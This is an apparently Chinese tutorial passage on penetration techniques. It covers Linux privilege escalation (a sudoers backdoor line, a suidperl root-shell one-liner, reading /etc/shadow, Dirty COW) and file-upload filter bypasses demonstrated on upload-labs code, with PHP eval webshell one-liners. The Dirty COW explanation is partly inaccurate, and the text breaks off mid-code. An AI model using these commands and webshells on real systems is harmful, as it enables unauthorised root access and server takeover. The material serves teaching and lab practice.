<p>运行一个程序，就能够以root权限运行：sudo &#x2F;usr&#x2F;bin&#x2F;vim</p>
<h4 id="etc-sudoers提权"><a href="#etc-sudoers提权" class="headerlink" title="&#x2F;etc&#x2F;sudoers提权"></a>&#x2F;etc&#x2F;sudoers提权</h4><p>查看是否存在可利用的sudoers文件：cat &#x2F;etc&#x2F;sudoers、cat &#x2F;etc&#x2F;sudoers.d&#x2F;*</p>
<p>如果存在可利用的sudoers文件，就可以添加一条提权规则：echo “hacker ALL&#x3D;(ALL) NOPASSWD: ALL” &gt;&gt; &#x2F;etc&#x2F;sudoers</p>
<p>切换到hacker用户，就能够以root权限运行：sudo su</p>
<h4 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h4><p>查看正在运行的系统服务：ps aux | grep root</p>
<p>查找这些服务是否有漏洞：searchsploit <service> | grep -i “privilege escalation”</p>
<p>找到一个有漏洞的服务，利用漏洞获取root权限</p>
<h4 id="枚举系统提权"><a href="#枚举系统提权" class="headerlink" title="枚举系统提权"></a>枚举系统提权</h4><p>查找系统中的敏感文件：find &#x2F; -name *.txt -o -name *.log -o -name *.conf -o -name *.sh</p>
<p>查看这些文件是否有漏洞，是否包含root密码等信息</p>
<p>利用这些信息获取root权限</p>
<h4 id="suidperl提权"><a href="#suidperl提权" class="headerlink" title="suidperl提权"></a>suidperl提权</h4><p>查找系统中是否安装了suidperl：find &#x2F; -name suidperl 2&gt;&#x2F;dev&#x2F;null</p>
<p>如果存在suidperl，就可以利用漏洞获取root权限：suidperl -e ‘use POSIX qw(setuid); POSIX::setuid(0); exec “&#x2F;bin&#x2F;sh”;’</p>
<h4 id="etc-shadow提权"><a href="#etc-shadow提权" class="headerlink" title="&#x2F;etc&#x2F;shadow提权"></a>&#x2F;etc&#x2F;shadow提权</h4><p>查看&#x2F;etc&#x2F;shadow文件是否有漏洞：cat &#x2F;etc&#x2F;shadow</p>
<p>如果存在可利用的漏洞，就可以利用漏洞获取root权限</p>
<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取  其他只读内存映射的写权限，进一步获取 root 权限。脏牛在Linux提权中比较重要，这里详细讲解一下。</p>
<p>脏牛漏洞的漏洞点位于 Linux 内核中的 “mm&#x2F;madvise.c” 文件中。攻击者可以通过对某个可写的映射文件的 “madvise()” 系统调用进行操纵，从而触发内核中的一个缺陷。攻击者通过修改页表项和文件系统缓存，将映射文件的权限更改为 “可写”，并且将该文件映射到内存中。这样，攻击者可以在内存中修改文件的内容，并将多个进程的 Copy-On-Write 页面指向被修改的内存页，绕过 “Copy-On-Write” 的保护机制，比如cow.c</p>
<p> <strong>利用过程：</strong><br>  - 攻击者首先找到一个可写的映射文件，通常是一个拥有 “suid” 或 “sgid” 权限的可执行文件。<br>  - 通过执行一段特制的代码，利用 “madvise()” 系统调用漏洞修改文件的权限。<br>  - 攻击者通过将修改后的文件映射到内存并修改其中的特定字段，来爆发该漏洞。<br>  - 当其他进程尝试对该映射文件执行写操作时，会将进程的 “Copy-On-Write” 页面指向被修改的内存页。<br>  - 最终，攻击者就能够在内核中执行具有 root 权限的恶意代码。</p>
<p>需要注意的是，脏牛漏洞需要本地访问权限才能利用，因此攻击者需要先获得一定的局部权限来执行漏洞利用代码。</p>
<p>一旦攻击者成功利用了脏牛漏洞，就可以获取 root 权限，并且对受影响的系统进行任意的操作。因此，及时更新系统和修复脏牛漏洞非常重要。提权攻击总是需要安全补丁和合适的防御措施来减少风险。</p>
<p>他的演示是，首先通过nmap，找一下目标机器ip，然后找存活端口，之后，访问对应界面，之后发现对应网站指纹之后，通过msf找对应的exp，之后收集内网漏洞信息，之后就是利用了，一种是上传exp利用，之后就可以su登录root，还有一种是</p>
<h2 id="frp内网告警分析"><a href="#frp内网告警分析" class="headerlink" title="frp内网告警分析"></a>frp内网告警分析</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/YJ_12340/article/details/127637425">https://blog.csdn.net/YJ_12340/article/details/127637425</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/386264.html">https://www.freebuf.com/articles/system/386264.html</a></p>
<h2 id="cc链和cb链条"><a href="#cc链和cb链条" class="headerlink" title="cc链和cb链条"></a>cc链和cb链条</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46081990/article/details/135724944">https://blog.csdn.net/qq_46081990/article/details/135724944</a></p>
<h2 id="文件上传绕过和检测"><a href="#文件上传绕过和检测" class="headerlink" title="文件上传绕过和检测"></a>文件上传绕过和检测</h2><h3 id="常见检测点："><a href="#常见检测点：" class="headerlink" title="常见检测点："></a>常见检测点：</h3><ul>
<li>客户端的JS检测（主要检测文件名后缀）</li>
<li>服务端检测（MINE类型检测、文件后缀名、文件格式头）</li>
</ul>
<h3 id="1-1-前端JavaScript检测"><a href="#1-1-前端JavaScript检测" class="headerlink" title="1.1 前端JavaScript检测"></a><strong>1.1 前端JavaScript检测</strong></h3><p>前端一般都是使用js来限制我们的上传类型和文件大小，这里以upload-labs Pass-01的源码为例：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于前端的检测我们可以抓包来修改文件类型，也可以禁用掉JavaScript。总之，只有前端的限制是非常不安全的，非常容易被绕过。</p>
<h3 id="2-1-后端检测文件类型"><a href="#2-1-后端检测文件类型" class="headerlink" title="2.1 后端检测文件类型"></a><strong>2.1 后端检测文件类型</strong></h3><p>2.1.1 检测content-type</p>
<p>后端代码大致为：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allow_content_type = <span class="title function_">array</span>(<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">$path = <span class="string">&quot;./uploads&quot;</span>;</span><br><span class="line">$type = $_FILES[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">in_array</span>($type, $allow_content_type)) &#123;</span><br><span class="line">        <span class="title function_">die</span>(<span class="string">&quot;File type error!&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = $path . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $file)) &#123;</span><br><span class="line">                echo <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                echo <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>绕过方法：</p>
<p>抓包将<code>content-type</code>改为图片形式（即’image&#x2F;png’等），即可成功上传。</p>
<h3 id="2-1-2-检测文件头判断文件类型"><a href="#2-1-2-检测文件头判断文件类型" class="headerlink" title="2.1.2 检测文件头判断文件类型"></a><strong>2.1.2 检测文件头判断文件类型</strong></h3><p>后端代码大致为：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allow_mime = <span class="title function_">array</span>(<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">$imageinfo = <span class="title function_">getimagesize</span>($_FILES[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">$path = <span class="string">&quot;./uploads&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">in_array</span>($imageinfo[<span class="string">&#x27;mime&#x27;</span>], $allow_mime)) &#123;</span><br><span class="line">        <span class="title function_">die</span>(<span class="string">&quot;File type error!&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = $path . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&quot;myfile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $file)) &#123;</span><br><span class="line">                echo <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                echo <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此时虽然检查的也是文件类型，但是是使用<code>getimagesize()</code>函数来获取文件的MIME类型，此时检测的不是数据包中的<code>content-type</code>，而是图片的文件头，常见的图片文件头如下：</p>
<blockquote>
<p>gif(GIF89a) : 47 49 46 38 39 61 jpg、jpeg : FF D8 FF png : 89 50 4E 47 0D 0A</p>
</blockquote>
<p>绕过方法：</p>
<p>当上传php文件时，可以使用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测。</p>
<h3 id="2-2-后端检测文件扩展名"><a href="#2-2-后端检测文件扩展名" class="headerlink" title="2.2 后端检测文件扩展名"></a><strong>2.2 后端检测文件扩展名</strong></h3><p>2.2.1 黑名单检测</p>
<p>后端代码大致为：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// 实际情况中黑名单内数据会更多更全面</span></span><br><span class="line">$blacklist = <span class="title function_">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>);</span><br><span class="line">$path = <span class="string">&quot;./uploads&quot;</span>;</span><br><span class="line">$type = <span class="title function_">array_pop</span>(<span class="title function_">explode</span>(<span class="string">&#x27;.&#x27;</span>, $_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">in_array</span>(<span class="title function_">strtolower</span>($type), $blacklist)) &#123;</span><br><span class="line">        <span class="title function_">die</span>(<span class="string">&quot;File type errer!&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = $path . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $file)) &#123;</span><br><span class="line">                echo <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                echo <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>众所周知使用黑名单是非常不安全的，很多网站会使用扩展名黑名单来限制上传文件类型，有些甚至在判断时都不用<code>strtolower()</code>来处理，因此造成漏洞</p>
<p>绕过方法：</p>
<ol>
<li>使用一些特殊扩展名来绕过（如php可以使用php3、php4、php5等来代替）</li>
<li>在后端比较没有转换大小写处理时，使用大小写混淆（如将php改为pHp等）来绕过</li>
</ol>
<h3 id="2-2-2-白名单检测"><a href="#2-2-2-白名单检测" class="headerlink" title="2.2.2 白名单检测"></a>2.2.2 白名单检测</h3><p>大致代码如下，与黑名单检测没有太大差别：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$whitelist = <span class="title function_">array</span>(<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">$path = <span class="string">&quot;./uploads&quot;</span>;</span><br><span class="line">$type = <span class="title function_">array_pop</span>(<span class="title function_">explode</span>(<span class="string">&#x27;.&#x27;</span>, $_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">in_array</span>(<span class="title function_">strtolower</span>($type), $whitelist)) &#123;</span><br><span class="line">        <span class="title function_">die</span>(<span class="string">&quot;File type errer!&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = $path . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $file)) &#123;</span><br><span class="line">                echo <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                echo <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>白名单相对与黑名单就安全许多，要求只能是特定扩展名的文件才能上传，虽然我们无法从代码层面来绕过，但这样也不是绝对的安全，可以利用其他漏洞来绕过</p>
<p>绕过方法：</p>
<p>使用%00截断文件名来上传（后面会讲）</p>
<p>如果目标还存在文件包含漏洞，那么就可以上传图片马再文件包含来拿shell</p>
<h3 id="2-3-后端检测文件内容"><a href="#2-3-后端检测文件内容" class="headerlink" title="2.3 后端检测文件内容"></a>2.3 后端检测文件内容</h3><p>2.3.1 文件内容替换</p>
<p>这种主要是将文件中的敏感字符替换掉，大致代码类似于下面这样：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = <span class="string">&quot;./uploads&quot;</span>;</span><br><span class="line">$content = <span class="title function_">file_get_contents</span>($_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">$content = <span class="title function_">str_replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $content);</span><br><span class="line">$file = $path . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $file)) &#123;</span><br><span class="line">        <span class="title function_">file_put_contents</span>($file, $content);</span><br><span class="line">        echo <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此时如果我们要上传php的一句话<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>时，php的语言标记中的?会被替换为!，这样一句话就不能被执行了</p>
<p>绕过方法：</p>
<p>主要还是要根据实际过滤的字符来判断，如果写死的话可能是没办法的（一般不会，因为还要兼顾图片上传）</p>
<p>比如过滤掉问号，我们就可以使用<code>&lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;);&lt;/script&gt;</code>这样的一句话。具体方法要看实际代码过滤了哪些字符。</p>
<h3 id="2-3-2-图片二次渲染"><a href="#2-3-2-图片二次渲染" class="headerlink" title="2.3.2 图片二次渲染"></a>2.3.2 图片二次渲染</h3><p>我们以upload-labs Pass-16的源码为例：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=<span class="variable constant_">UPLOAD_PATH</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_">basename</span>($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= <span class="title function_">substr</span>(<span class="title function_">strrchr</span>($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">move_uploaded_file</span>($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = <span class="title function_">imagecreatefromjpeg</span>($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_">unlink</span>($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_">srand</span>(<span class="title function_">time</span>());</span><br><span class="line">                $newfilename = <span class="title function_">strval</span>(<span class="title function_">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = <span class="variable constant_">UPLOAD_PATH</span>.<span class="string">&#x27;/&#x27;</span>.<span class="property">$newfilename</span>;</span><br><span class="line">                <span class="title function_">imagejpeg</span>($im,$img_path);</span><br><span class="line">                @<span class="title function_">unlink</span>($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>大致意思是后端调用了php的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p>
<p>我自己在测试时发现不管是直接修改文件头来制作的图片马，还是利用copy命令制作的图片马，都无法避免其中的一句话被过滤掉。</p>
<p>而看了一篇文章发现其实要把一句话插入到图片数据中，这样经过渲染后这部分数据还是会保留下来。大家可以看一下作为参考：<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://secgeek.net/bookfresh-vulnerability/&source=article&objectId=1795120">https://secgeek.net/bookfresh-vulnerability/</a></p>
<h3 id="3-1-解析漏洞及其他漏洞"><a href="#3-1-解析漏洞及其他漏洞" class="headerlink" title="3.1 解析漏洞及其他漏洞"></a>3.1 解析漏洞及其他漏洞</h3><p>3.1.1 IIS解析漏洞</p>
<p>IIS6.0</p>
<p>在IIS6.0中有两个很重要的asp解析漏洞：</p>
<ol>
<li>假设当前有一个名为”xxx.asp”的目录，那么该目录下的所有文件都将被作为asp文件解析</li>
<li>假设上传一个名为”test.asp;xxx.jpg”时，该文件会被当做asp文件解析</li>
</ol>
<p>IIS7.5</p>
<p>这个其实不能算IIS的洞，它其实是php的解析漏洞，这个漏洞利用条件是<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>在php.ini中将<code>cgi.fix_pathinfo</code>的值设置为1</p>
<p>然后当我们访问服务器上任意一个文件时（如：<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://test.com/a.jpg&source=article&objectId=1795120">http://test.com/a.jpg</a>），当我们在URL后面添加<code>.php</code>（即：<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://test.com/a.jpg/.php&source=article&objectId=1795120">http://test.com/a.jpg/.php</a>），那么文件a.jpg就将被作为php文件来解析。</p>
<h3 id="3-1-2-Apache解析漏洞"><a href="#3-1-2-Apache解析漏洞" class="headerlink" title="3.1.2 Apache解析漏洞"></a>3.1.2 Apache解析漏洞</h3><p>利用低版本apache扩展名解析特性</p>
<p>在了解这个解析漏洞之前，我们要首先了解apache和php的三种结合方式：</p>
<blockquote>
<p>Apache和php三种结合方式： 1.CGI 2.Module 3.FastCGI</p>
</blockquote>
<p>该解析漏洞只有在apache和php以Module方式结合时才存在，而且Apache还有一个特性：</p>
<blockquote>
<p>Apache在解析文件时会以文件名从右向左解析，当最后一个扩展名无法识别时，就会向左查看是否有可以识别的文件名，如果没有的话就以配置中的默认文件类型来解析 例如： a.php.xxx因为xxx无法识别，而左边的php可识别，就会被解析为php文件</p>
</blockquote>
<p>因此，如果上传文件名为a.php.xxx的一句话，访问后就很可能拿到shell</p>
<p><strong>CVE-2017-15715</strong></p>
<p>还有一个apache的解析漏洞就是CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是<code>\x0A</code>，如上传a.php，然后在burp中修改文件名为<code>a.php\x0A</code>)，以此来绕过一些黑名单过滤</p>
<p>具体的漏洞分析可以看p牛：<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html&source=article&objectId=1795120">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p>
<h3 id="3-1-3-00截断"><a href="#3-1-3-00截断" class="headerlink" title="3.1.3 %00截断"></a>3.1.3 %00截断</h3><p>这个多数被利用在截断路径，利用的条件是：</p>
<blockquote>
<p>PHP &lt; 5.3.4 magic_quotes_gpc 关闭</p>
</blockquote>
<p>因为<code>0x00</code>是字符串的结束标志符，所以php在读取到<code>0x00</code>时就不会再往后读取，我们可以利用这些截断字符后面不需要的内容</p>
<p>以upload-labs的Pass-12为例，源码如下：</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="title function_">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = <span class="title function_">substr</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_">strrpos</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">in_array</span>($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = 